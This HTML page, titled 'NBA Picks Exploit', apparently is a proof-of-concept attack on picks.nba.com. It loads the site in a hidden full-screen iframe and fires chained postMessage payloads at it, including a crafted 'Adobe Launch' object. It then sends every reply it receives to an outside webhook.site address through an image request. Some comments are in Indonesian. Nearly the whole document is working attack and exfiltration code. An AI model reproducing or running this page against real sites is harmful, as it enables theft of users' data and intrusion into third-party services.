<!DOCTYPE html>
<html>
<head>
  <title>NBA Picks Exploit</title>
  <style>
    html, body, iframe {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
    }
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      border: none;
      z-index: 10;
    }
  </style>
</head>
<body>
  <iframe id="target" src="https://picks.nba.com" sandbox="allow-scripts allow-same-origin allow-forms" allow="clipboard-read; clipboard-write"></iframe>

  <script>
    const targetFrame = document.getElementById("target");

    function sendResize() {
      const resizePayload = {
        event: "resize",
        height: 2000
      };
      targetFrame.contentWindow.postMessage(resizePayload, "*");
      console.log("[+] Resize payload dikirim");
    }

    function sendAdobePayload() {
      const payload = {
        payload: {
          instance: {
            sourceConfiguration: {
              options: {
                consentData: {},
                abTesting: {},
                diagnostics: {},
                multiplexing: {}
              }
            },
            fetchIdData: {
              refererInfo: {
                stack: [null]
              },
              abTesting: {},
              uaHints: {
                brands: [{}],
                fullVersionList: []
              },
              trueLink: {}
            }
          },
          instanceState: {
            knownInstances: [],
            multiplexing: {}
          }
        }
      };
      targetFrame.contentWindow.postMessage(payload, "*");
      console.log("[+] Adobe Launch payload dikirim");
    }

    // Listener untuk response dari iframe picks.nba.com
    window.addEventListener("message", function(event) {
      console.log(`[🔔] Message from iframe`);
      console.log("Origin:", event.origin);
      console.log("Data:", event.data);

      try {
        const exfilData = encodeURIComponent(JSON.stringify({
          origin: event.origin,
          data: event.data
        }));

        // Gunakan <img> sebagai saluran exfil
        const img = new Image();
        img.src = "https://webhook.site/357a3362-1db3-4f0f-acf7-bca1f697ca37?data=" + exfilData;
        console.log("[📤] Data exfiltrated via image");
      } catch (err) {
        console.error("[❌] Gagal exfiltrate:", err);
      }
    });

    // Payload chaining
    setTimeout(() => {
      sendResize();
      setTimeout(() => {
        sendAdobePayload();
      }, 2000);
    }, 1000);
  </script>
</body>
</html>
